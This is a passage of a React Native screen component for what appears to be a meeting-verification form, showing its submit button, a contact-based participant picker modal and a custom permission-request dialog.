                    className="text-gray-900 text-sm font-medium"
                    numberOfLines={1}
                  >
                    {supportingDoc.name}
                  </Text>
                </View>
              )}

              <TouchableOpacity
                onPress={handleDocumentUpload}
                activeOpacity={0.9}
                className={`px-4 py-3 rounded-2xl flex-row items-center self-start bg-blue-600`}
              >
                <Ionicons
                  name="folder-open-outline"
                  size={18}
                  color="#ffffff"
                />
                <Text className="text-white font-semibold text-sm ml-2">
                  {supportingDoc ? "Change Document" : "Select Document"}
                </Text>
              </TouchableOpacity>
            </View>
          </ScrollView>

          {/* Submit Button */}
          <View className="w-full flex-row items-center justify-center">
            <TouchableOpacity
              disabled={
                !title ||
                !description ||
                !selectedDate ||
                !uploadedPhoto ||
                !supportingDoc
              }
              onPress={handleSave}
              activeOpacity={0.95}
              className={`rounded-2xl py-4 w-[70%] flex-row items-center justify-center ${
                title &&
                description &&
                selectedDate &&
                uploadedPhoto &&
                supportingDoc
                  ? "bg-blue-600"
                  : "bg-gray-300"
              }`}
              style={
                title &&
                description &&
                selectedDate &&
                uploadedPhoto &&
                supportingDoc
                  ? {
                      shadowColor: "#3b82f6",
                      shadowOffset: { width: 0, height: 4 },
                      shadowOpacity: 0.28,
                      shadowRadius: 8,
                      elevation: 8,
                    }
                  : {}
              }
            >
              {loading ? (
                <ActivityIndicator color="#ffffff" />
              ) : (
                <>
                  <Ionicons
                    name="checkmark-done-outline"
                    size={20}
                    color="#ffffff"
                  />
                  <Text className="text-white text-base font-bold ml-2">
                    Submit Form
                  </Text>
                </>
              )}
            </TouchableOpacity>
          </View>

          {/* Participants Picker Modal */}
          {showContactPicker && (
            <View
              style={{
                position: "absolute",
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                backgroundColor: "rgba(15,23,42,0.45)",
                justifyContent: "center",
                alignItems: "center",
                padding: 20,
                zIndex: 9999,
              }}
            >
              <View
                style={{
                  backgroundColor: "white",
                  width: "100%",
                  maxHeight: "80%",
                  borderRadius: 24,
                  paddingVertical: 16,
                  paddingHorizontal: 14,
                }}
              >
                <Text
                  style={{
                    fontSize: 18,
                    fontWeight: "700",
                    color: "#111827",
                    textAlign: "center",
                    marginBottom: 4,
                  }}
                >
                  Select Participants
                </Text>
                <Text
                  style={{
                    fontSize: 13,
                    color: "#4b5563",
                    textAlign: "center",
                    marginBottom: 12,
                  }}
                >
                  Tap to select participants from your official contacts.
                </Text>

                <ScrollView
                  style={{
                    borderTopWidth: 1,
                    borderBottomWidth: 1,
                    borderColor: "#e5e7eb",
                    marginBottom: 12,
                  }}
                >
                  {contacts.slice(0, 1000).map((c, i) => {
                    const id =
                      c.id ||
                      c.recordID ||
                      c.phoneNumbers?.[0]?.number ||
                      `${c.name}-${i}`;
                    const name =
                      c.name ||
                      c.displayName ||
                      c.phoneNumbers?.[0]?.number ||
                      "Unnamed";
                    const number = c.phoneNumbers?.[0]?.number || "";

                    const isSelected = selectedParticipants.some(
                      (p) => p.id === id
                    );

                    return (
                      <TouchableOpacity
                        key={id}
                        onPress={() => {
                          setSelectedParticipants((prev) => {
                            if (isSelected) {
                              return prev.filter((p) => p.id !== id);
                            } else {
                              return [...prev, { id, name, number }];
                            }
                          });
                        }}
                        style={{
                          flexDirection: "row",
                          alignItems: "center",
                          paddingVertical: 10,
                          paddingHorizontal: 4,
                          borderBottomWidth: 1,
                          borderColor: "#f3f4f6",
                          backgroundColor: isSelected ? "#eff6ff" : "white",
                        }}
                      >
                        <View
                          style={{
                            width: 22,
                            height: 22,
                            borderRadius: 8,
                            borderWidth: 2,
                            borderColor: isSelected ? "#2563eb" : "#9ca3af",
                            backgroundColor: isSelected ? "#2563eb" : "white",
                            justifyContent: "center",
                            alignItems: "center",
                            marginRight: 12,
                          }}
                        >
                          {isSelected && (
                            <Text
                              style={{
                                color: "white",
                                fontSize: 14,
                                fontWeight: "bold",
                              }}
                            >
                              ✓
                            </Text>
                          )}
                        </View>
                        <View>
                          <Text
                            style={{
                              fontWeight: isSelected ? "700" : "500",
                              color: "#111827",
                            }}
                          >
                            {name}
                          </Text>
                          {!!number && (
                            <Text style={{ fontSize: 13, color: "#6b7280" }}>
                              {number}
                            </Text>
                          )}
                        </View>
                      </TouchableOpacity>
                    );
                  })}
                </ScrollView>

                <View
                  style={{
                    flexDirection: "row",
                    justifyContent: "space-between",
                  }}
                >
                  <TouchableOpacity
                    onPress={() => setShowContactPicker(false)}
                    style={{
                      flex: 1,
                      backgroundColor: "#e5e7eb",
                      padding: 11,
                      borderRadius: 12,
                      marginRight: 6,
                    }}
                  >
                    <Text style={{ textAlign: "center", color: "#374151" }}>
                      Cancel
                    </Text>
                  </TouchableOpacity>
                  <TouchableOpacity
                    onPress={() => {
                      setShowContactPicker(false);
                      Toast.show({
                        type: "success",
                        text1: `${selectedParticipants.length} participant(s) added`,
                      });
                    }}
                    style={{
                      flex: 1,
                      backgroundColor: "#2563eb",
                      padding: 11,
                      borderRadius: 12,
                      marginLeft: 6,
                    }}
                  >
                    <Text style={{ textAlign: "center", color: "white" }}>
                      Confirm
                    </Text>
                  </TouchableOpacity>
                </View>
              </View>
            </View>
          )}
          {/* Custom Permission Modal */}
          {permissionDialog.visible && (
            <View
              style={{
                position: "absolute",
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                backgroundColor: "rgba(0,0,0,0.45)",
                justifyContent: "center",
                alignItems: "center",
                padding: 20,
                zIndex: 9999,
              }}
            >
              <View
                style={{
                  width: "90%",
                  backgroundColor: "white",
                  borderRadius: 22,
                  paddingVertical: 20,
                  paddingHorizontal: 18,
                }}
              >
                <Text
                  style={{
                    fontSize: 18,
                    fontWeight: "700",
                    color: "#111827",
                    textAlign: "center",
                    marginBottom: 8,
                  }}
                >
                  {permissionDialog.name} Permission Required
                </Text>

                <Text
                  style={{
                    fontSize: 14,
                    color: "#4b5563",
                    textAlign: "center",
                    marginBottom: 20,
                  }}
                >
                  To verify your meeting, please allow the{" "}
                  {permissionDialog.name} permission.
                </Text>

                <View
                  style={{
                    flexDirection: "row",
                    justifyContent: "space-between",
                  }}
                >
                  {/* Cancel */}
                  <TouchableOpacity
                    onPress={() => {
                      permissionDialog.resolve?.("cancel");
                      setPermissionDialog({ visible: false, name: "" });
                    }}
                    style={{
                      flex: 1,
                      backgroundColor: "#e5e7eb",
                      paddingVertical: 12,
                      borderRadius: 12,
                      marginRight: 6,
                    }}
                  >
                    <Text style={{ textAlign: "center", color: "#374151" }}>
                      Cancel
                    </Text>
                  </TouchableOpacity>

                  {/* Retry */}
                  <TouchableOpacity
                    onPress={() => {
                      permissionDialog.resolve?.("retry");
                      setPermissionDialog({ visible: false, name: "" });
                    }}
                    style={{
                      flex: 1,
                      backgroundColor: "#2563eb",
                      paddingVertical: 12,
                      borderRadius: 12,
                      marginLeft: 6,
                      marginRight: 6,
                    }}
                  >
                    <Text style={{ textAlign: "center", color: "white" }}>
                      Retry
                    </Text>
                  </TouchableOpacity>

                  {/* Settings */}
                  <TouchableOpacity
                    onPress={() => {
                      permissionDialog.resolve?.("settings");
                      setPermissionDialog({ visible: false, name: "" });
                    }}
                    style={{
                      flex: 1,
                      backgroundColor: "#facc15",
                      paddingVertical: 12,
                      borderRadius: 12,
                      marginLeft: 6,
                    }}
                  >
                    <Text style={{ textAlign: "center", color: "#111" }}>
                      Settings
                    </Text>
                  </TouchableOpacity>
                </View>
              </View>
            </View>
          )}

          <Toast />
        </KeyboardAvoidingView>
      </SafeAreaView>
    </LinearGradient>
  );
}
